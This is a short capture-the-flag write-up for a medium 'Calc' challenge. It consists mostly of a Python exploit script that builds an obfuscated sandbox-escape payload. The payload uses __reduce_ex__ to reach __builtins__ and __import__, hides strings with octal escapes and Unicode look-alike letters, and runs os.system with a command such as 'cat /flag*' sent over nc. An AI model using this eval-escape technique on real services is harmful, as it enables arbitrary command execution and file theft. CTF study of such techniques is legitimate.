# Calc
- Author: Vincent55
- Category: Misc
- Difficulty: Medium

Just a normal calculator, can you break it?


## exploit
```python
import sys

def to_unicode(s):
    alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
    return ''.join([chr(alphabet.index(c) + 0x1D608) if c in alphabet else c for c in s])

def string_to_octal_escape(s):
    return ''.join(r'\{:o}'.format(ord(c)) for c in s)

_import = string_to_octal_escape("__import__")
_os = string_to_octal_escape("os")
_cat_flag = string_to_octal_escape(sys.argv[1])
print(_cat_flag.replace('\\', '\\\\'))

payload = f"[]._＿reduce_ex_＿(3)[0].__builtins__['{_import}']('{_os}').system('{_cat_flag}')"

payload = f"""(b:=''._＿reduce_ex_＿(3).__iter__().__next__().__builtins__.values().__iter__(),
b.__next__(),
b.__next__(),
b.__next__(),
b.__next__(),
b.__next__(),
b.__next__(),
b.__next__()('{_os}').system('{_cat_flag}'))""".replace('\n', '')

print(to_unicode(payload))

# python exploit.py "cat /flag*" | nc localhost 10003

```
